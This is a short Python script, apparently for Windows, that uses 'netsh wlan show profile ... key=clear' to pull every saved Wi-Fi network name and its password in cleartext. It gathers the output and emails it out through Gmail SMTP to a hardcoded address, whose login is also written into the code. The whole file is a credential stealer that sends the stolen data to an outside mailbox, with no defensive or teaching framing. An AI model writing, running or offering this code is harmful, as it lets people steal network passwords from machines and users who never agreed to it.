import subprocess as sp, smtplib, re
def send_mail(email, password, message):
    print(message)
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email, email, message)
    server.quit()

def edit(network_name):
    list = []
    for letters in network_name:
        list.append(letters)
    list.remove("\r")
    list.insert(0,"\"")
    list.append("\"")
    network_name = ""
    for letters in list:
        network_name+=letters
    return(network_name)

command = "netsh wlan show profile "
networks =  sp.check_output(command, shell= True)
network_names = re.findall("(?:Profile\s*:\s)(.*)".encode(),networks)  #list of networks
# print(network_names)
result = ""
for network_name in network_names:
    network_name = network_name.decode()
    network_name = edit(network_name)
    command = "netsh wlan show profile name= "+ network_name +" key=clear"
    current_result = sp.check_output(command, shell=True)
    current_result = str(current_result)


    result+=current_result


send_mail("tcode518@gmail.com","trialonly@1234",result)

